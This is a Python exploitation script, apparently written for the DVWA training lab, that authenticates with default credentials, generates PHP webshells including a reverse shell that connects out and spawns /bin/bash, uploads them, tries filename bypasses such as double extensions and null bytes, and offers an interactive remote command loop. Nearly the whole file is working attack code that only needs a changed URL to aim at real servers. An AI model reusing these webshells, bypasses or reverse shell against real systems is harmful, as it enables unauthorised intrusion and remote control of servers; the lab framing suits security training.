#!/usr/bin/env python3
"""
File Upload Exploitation Script for DVWA
Author: Daniel Oyanogbezina
Purpose: Educational demonstration of file upload vulnerabilities
"""

import requests
from bs4 import BeautifulSoup
import sys
import argparse
import os
import time
from urllib.parse import urljoin

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    class Fore:
        CYAN = YELLOW = GREEN = RED = MAGENTA = WHITE = BLUE = ""
    class Style:
        RESET_ALL = BRIGHT = ""
    COLORS_AVAILABLE = False

# Configuration
BASE_URL = "http://localhost"
TARGET_URL = BASE_URL + "/vulnerabilities/upload/"
LOGIN_URL = BASE_URL + "/login.php"
SECURITY_URL = BASE_URL + "/security.php"
UPLOAD_DIR = BASE_URL + "/hackable/uploads/"

def print_banner():
    """Display tool banner"""
    banner = """
================================================================
    File Upload Exploitation Tool - DVWA
    Author: Daniel Oyanogbezina
    Educational Purpose Only - Use Responsibly
================================================================
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)
    
    if not COLORS_AVAILABLE:
        print(Fore.YELLOW + "[!] Tip: Install colorama for colored output (pip3 install colorama)" + Style.RESET_ALL + "\n")

def extract_csrf_token(session, url):
    """Extract CSRF token from a page"""
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find('input', {'name': 'user_token'})
        
        if token_input:
            return token_input.get('value')
        return None
    except Exception as e:
        return None

def get_authenticated_session(username='admin', password='password', verbose=False):
    """Login to DVWA and set security level to low"""
    print(Fore.YELLOW + "[*] Authenticating to DVWA..." + Style.RESET_ALL)
    session = requests.Session()
    
    try:
        response = session.get(LOGIN_URL, timeout=10)
        
        if response.status_code != 200:
            print(Fore.RED + "[!] Failed to reach login page" + Style.RESET_ALL)
            return None
        
        user_token = extract_csrf_token(session, LOGIN_URL)
        
        login_data = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': user_token if user_token else ''
        }
        
        response = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
        
        if 'login.php' in response.url or 'logout' not in response.text.lower():
            print(Fore.RED + "[!] Login failed. Check credentials." + Style.RESET_ALL)
            return None
        
        print(Fore.GREEN + "[+] Successfully logged in as '" + username + "'" + Style.RESET_ALL)
        
        # Set security level to low
        print(Fore.YELLOW + "[*] Setting security level to 'low'..." + Style.RESET_ALL)
        security_token = extract_csrf_token(session, SECURITY_URL)
        
        if security_token:
            security_data = {
                'security': 'low',
                'seclev_submit': 'Submit',
                'user_token': security_token
            }
            session.post(SECURITY_URL, data=security_data)
        else:
            session.get(SECURITY_URL + "?security=low&seclev_submit=Submit")
        
        print(Fore.GREEN + "[+] Security level set to 'low'" + Style.RESET_ALL)
        return session
        
    except requests.exceptions.ConnectionError:
        print(Fore.RED + "[!] Connection Error: Could not connect to " + BASE_URL + Style.RESET_ALL)
        return None
    except Exception as e:
        print(Fore.RED + "[!] Authentication error: " + str(e) + Style.RESET_ALL)
        return None

def create_php_webshell(shell_type='simple', output_file='shell.php'):
    """Create different types of PHP webshells"""
    
    shells = {
        'simple': '''<?php
// Simple Web Shell
// Usage: shell.php?cmd=whoami
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>''',
        
        'advanced': '''<?php
// Advanced Web Shell with Output
// Usage: shell.php?cmd=ls -la
echo "<pre>";
if(isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
    echo htmlspecialchars($output);
} else {
    echo "Usage: ?cmd=command";
    echo "\nExamples:";
    echo "\n  ?cmd=whoami";
    echo "\n  ?cmd=pwd";
    echo "\n  ?cmd=ls -la";
    echo "\n  ?cmd=cat /etc/passwd";
}
echo "</pre>";
?>''',
        
        'interactive': '''<?php
// Interactive Web Shell
echo "<html><head><title>Web Shell</title></head><body>";
echo "<h2>Web Shell - Command Execution</h2>";
echo "<form method='GET'>";
echo "Command: <input type='text' name='cmd' size='50' autofocus>";
echo " <input type='submit' value='Execute'>";
echo "</form><hr>";

if(isset($_GET['cmd'])) {
    echo "<h3>Output:</h3>";
    echo "<pre>";
    $cmd = $_GET['cmd'];
    echo "$ " . htmlspecialchars($cmd) . "\n\n";
    echo htmlspecialchars(shell_exec($cmd));
    echo "</pre>";
}

echo "<hr><small>System: " . php_uname() . "</small>";
echo "</body></html>";
?>''',
        
        'reverse_shell': '''<?php
// PHP Reverse Shell
// Change IP and PORT before uploading
$ip = '127.0.0.1';  // Change to your IP
$port = 4444;        // Change to your port

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>'''
    }
    
    try:
        with open(output_file, 'w') as f:
            f.write(shells.get(shell_type, shells['simple']))
        return True
    except Exception as e:
        print(Fore.RED + "[!] Error creating shell: " + str(e) + Style.RESET_ALL)
        return False

def upload_file(session, file_path, verbose=False):
    """Upload a file to DVWA"""
    print(Fore.YELLOW + "[*] Uploading file: " + file_path + Style.RESET_ALL)
    
    if not os.path.exists(file_path):
        print(Fore.RED + "[!] File not found: " + file_path + Style.RESET_ALL)
        return None
    
    try:
        # Get upload page to extract CSRF token
        response = session.get(TARGET_URL)
        user_token = extract_csrf_token(session, TARGET_URL)
        
        if verbose:
            print(Fore.BLUE + "[DEBUG] Target URL: " + TARGET_URL + Style.RESET_ALL)
            if user_token:
                print(Fore.BLUE + "[DEBUG] CSRF Token: " + user_token[:20] + "..." + Style.RESET_ALL)
        
        # Prepare file upload
        filename = os.path.basename(file_path)
        
        with open(file_path, 'rb') as f:
            files = {
                'uploaded': (filename, f, 'application/octet-stream')
            }
            
            data = {
                'Upload': 'Upload'
            }
            
            if user_token:
                data['user_token'] = user_token
            
            # Upload file
            response = session.post(TARGET_URL, files=files, data=data)
            
            if response.status_code == 200:
                # Check for success message
                if 'succesfully uploaded' in response.text.lower() or 'successfully uploaded' in response.text.lower():
                    uploaded_url = UPLOAD_DIR + filename
                    print(Fore.GREEN + "[+] File uploaded successfully!" + Style.RESET_ALL)
                    print(Fore.GREEN + "    URL: " + uploaded_url + Style.RESET_ALL)
                    return uploaded_url
                else:
                    print(Fore.YELLOW + "[-] Upload may have failed" + Style.RESET_ALL)
                    if verbose:
                        # Check for error messages
                        soup = BeautifulSoup(response.text, 'html.parser')
                        error = soup.find('pre')
                        if error:
                            print(Fore.BLUE + "[DEBUG] Server response: " + error.get_text() + Style.RESET_ALL)
                    return None
            else:
                print(Fore.RED + "[-] Upload failed with status: " + str(response.status_code) + Style.RESET_ALL)
                return None
                
    except Exception as e:
        print(Fore.RED + "[!] Upload error: " + str(e) + Style.RESET_ALL)
        return None

def verify_upload(session, url, verbose=False):
    """Verify if uploaded file is accessible"""
    print(Fore.YELLOW + "[*] Verifying file accessibility..." + Style.RESET_ALL)
    
    try:
        response = session.get(url, timeout=5)
        
        if response.status_code == 200:
            print(Fore.GREEN + "[+] File is accessible!" + Style.RESET_ALL)
            if verbose:
                print(Fore.BLUE + "[DEBUG] Response length: " + str(len(response.text)) + " bytes" + Style.RESET_ALL)
            return True
        elif response.status_code == 404:
            print(Fore.RED + "[-] File not found (404)" + Style.RESET_ALL)
            return False
        else:
            print(Fore.YELLOW + "[!] Unexpected status: " + str(response.status_code) + Style.RESET_ALL)
            return False
            
    except Exception as e:
        print(Fore.RED + "[!] Verification error: " + str(e) + Style.RESET_ALL)
        return False

def execute_webshell(session, shell_url, command, verbose=False):
    """Execute command via uploaded webshell"""
    try:
        cmd_url = shell_url + "?cmd=" + requests.utils.quote(command)
        
        if verbose:
            print(Fore.BLUE + "[DEBUG] Executing: " + cmd_url + Style.RESET_ALL)
        
        response = session.get(cmd_url, timeout=10)
        
        if response.status_code == 200:
            return response.text
        else:
            return None
            
    except Exception as e:
        print(Fore.RED + "[!] Execution error: " + str(e) + Style.RESET_ALL)
        return None

def test_file_upload_bypass(session, verbose=False):
    """Test various file upload bypass techniques"""
    print("\n" + Fore.CYAN + "="*70 + Style.RESET_ALL)
    print(Fore.CYAN + "[*] Testing File Upload Bypass Techniques" + Style.RESET_ALL)
    print(Fore.CYAN + "="*70 + Style.RESET_ALL + "\n")
    
    bypass_techniques = [
        {
            'name': 'Direct PHP Upload',
            'filename': 'shell.php',
            'content': '<?php system($_GET["cmd"]); ?>',
            'description': 'Standard PHP file'
        },
        {
            'name': 'Double Extension',
            'filename': 'shell.php.jpg',
            'content': '<?php system($_GET["cmd"]); ?>',
            'description': 'PHP file with image extension'
        },
        {
            'name': 'Null Byte',
            'filename': 'shell.php\x00.jpg',
            'content': '<?php system($_GET["cmd"]); ?>',
            'description': 'Null byte injection'
        },
        {
            'name': 'Case Manipulation',
            'filename': 'shell.PhP',
            'content': '<?php system($_GET["cmd"]); ?>',
            'description': 'Mixed case extension'
        },
        {
            'name': 'Alternative Extension',
            'filename': 'shell.php5',
            'content': '<?php system($_GET["cmd"]); ?>',
            'description': 'PHP5 extension'
        }
    ]
    
    results = []
    
    for technique in bypass_techniques:
        print(Fore.YELLOW + "[*] Testing: " + technique['name'] + Style.RESET_ALL)
        print("    File: " + technique['filename'])
        print("    Description: " + technique['description'])
        
        # Create test file
        test_file = '/tmp/' + technique['filename']
        try:
            with open(test_file, 'w') as f:
                f.write(technique['content'])
            
            # Try upload
            url = upload_file(session, test_file, verbose)
            
            if url:
                # Verify access
                accessible = verify_upload(session, url, verbose)
                results.append({
                    'technique': technique['name'],
                    'success': True,
                    'url': url,
                    'accessible': accessible
                })
                print(Fore.GREEN + "[+] " + technique['name'] + " - SUCCESS" + Style.RESET_ALL)
            else:
                results.append({
                    'technique': technique['name'],
                    'success': False,
                    'url': None,
                    'accessible': False
                })
                print(Fore.RED + "[-] " + technique['name'] + " - FAILED" + Style.RESET_ALL)
            
            # Clean up
            if os.path.exists(test_file):
                os.remove(test_file)
            
        except Exception as e:
            print(Fore.RED + "[!] Error: " + str(e) + Style.RESET_ALL)
            results.append({
                'technique': technique['name'],
                'success': False,
                'url': None,
                'accessible': False
            })
        
        print()
    
    return results

def interactive_shell(session, shell_url):
    """Interactive shell interface"""
    print("\n" + Fore.CYAN + "="*70 + Style.RESET_ALL)
    print(Fore.CYAN + "[*] Interactive Web Shell" + Style.RESET_ALL)
    print(Fore.CYAN + "="*70 + Style.RESET_ALL)
    print(Fore.YELLOW + "\nShell URL: " + shell_url + Style.RESET_ALL)
    print(Fore.YELLOW + "Type 'exit' or 'quit' to stop\n" + Style.RESET_ALL)
    
    while True:
        try:
            command = input(Fore.GREEN + "shell> " + Style.RESET_ALL).strip()
            
            if command.lower() in ['exit', 'quit', 'q']:
                print(Fore.YELLOW + "\n[*] Exiting shell..." + Style.RESET_ALL)
                break
            
            if not command:
                continue
            
            output = execute_webshell(session, shell_url, command)
            
            if output:
                # Clean output
                output = output.strip()
                if output:
                    print(output)
            else:
                print(Fore.RED + "[!] Command execution failed" + Style.RESET_ALL)
                
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[*] Interrupted by user" + Style.RESET_ALL)
            break
        except Exception as e:
            print(Fore.RED + "[!] Error: " + str(e) + Style.RESET_ALL)

def print_summary(results):
    """Print test summary"""
    print("\n" + Fore.MAGENTA + "="*70 + Style.RESET_ALL)
    print(Fore.MAGENTA + "File Upload Test Summary" + Style.RESET_ALL)
    print(Fore.MAGENTA + "="*70 + Style.RESET_ALL)
    
    successful = [r for r in results if r['success']]
    accessible = [r for r in results if r.get('accessible', False)]
    
    print("\nResults:")
    print("  Total Tests: " + str(len(results)))
    print("  Successful Uploads: " + Fore.GREEN + str(len(successful)) + Style.RESET_ALL)
    print("  Accessible Files: " + Fore.GREEN + str(len(accessible)) + Style.RESET_ALL)
    
    if accessible:
        print("\n" + Fore.GREEN + "Accessible Shells:" + Style.RESET_ALL)
        for result in accessible:
            print("  - " + result['technique'] + ": " + result['url'])

def main():
    """Main execution function"""
    parser = argparse.ArgumentParser(
        description='DVWA File Upload Exploitation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-u', '--username', default='admin', help='DVWA username (default: admin)')
    parser.add_argument('-p', '--password', default='password', help='DVWA password (default: password)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--shell-type', choices=['simple', 'advanced', 'interactive', 'reverse_shell'], 
                       default='advanced', help='Type of webshell to create')
    parser.add_argument('--upload', metavar='FILE', help='Upload specific file')
    parser.add_argument('--test-bypasses', action='store_true', help='Test various upload bypass techniques')
    parser.add_argument('--interactive', action='store_true', help='Start interactive shell after upload')
    parser.add_argument('-o', '--output', default='shell.php', help='Output filename for generated shell')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Authenticate
    session = get_authenticated_session(args.username, args.password, args.verbose)
    
    if not session:
        print("\n" + Fore.RED + "[!] Failed to authenticate to DVWA" + Style.RESET_ALL)
        sys.exit(1)
    
    try:
        # Test bypass techniques
        if args.test_bypasses:
            results = test_file_upload_bypass(session, args.verbose)
            print_summary(results)
            return
        
        # Upload specific file or create webshell
        if args.upload:
            file_to_upload = args.upload
            if not os.path.exists(file_to_upload):
                print(Fore.RED + "[!] File not found: " + file_to_upload + Style.RESET_ALL)
                sys.exit(1)
        else:
            # Create webshell
            print(Fore.YELLOW + "[*] Creating " + args.shell_type + " webshell..." + Style.RESET_ALL)
            if not create_php_webshell(args.shell_type, args.output):
                print(Fore.RED + "[!] Failed to create webshell" + Style.RESET_ALL)
                sys.exit(1)
            
            print(Fore.GREEN + "[+] Webshell created: " + args.output + Style.RESET_ALL)
            file_to_upload = args.output
        
        # Upload file
        shell_url = upload_file(session, file_to_upload, args.verbose)
        
        if not shell_url:
            print(Fore.RED + "\n[!] Upload failed" + Style.RESET_ALL)
            sys.exit(1)
        
        # Verify upload
        if verify_upload(session, shell_url, args.verbose):
            print(Fore.GREEN + "\n[+] Webshell successfully deployed!" + Style.RESET_ALL)
            print(Fore.CYAN + "\n[*] Access your shell at: " + shell_url + Style.RESET_ALL)
            print(Fore.CYAN + "[*] Example: " + shell_url + "?cmd=whoami" + Style.RESET_ALL)
            
            # Start interactive shell if requested
            if args.interactive:
                interactive_shell(session, shell_url)
        
        print("\n" + Fore.MAGENTA + "="*70 + Style.RESET_ALL)
        print(Fore.MAGENTA + "[!] Educational Demonstration Complete" + Style.RESET_ALL)
        print(Fore.MAGENTA + "[!] Always obtain authorization before security testing" + Style.RESET_ALL)
        print(Fore.MAGENTA + "="*70 + Style.RESET_ALL + "\n")
        
    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "[!] Interrupted by user" + Style.RESET_ALL)
        sys.exit(0)
    except Exception as e:
        print("\n" + Fore.RED + "[!] Unexpected error: " + str(e) + Style.RESET_ALL)
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "[!] Interrupted" + Style.RESET_ALL)
        sys.exit(0)
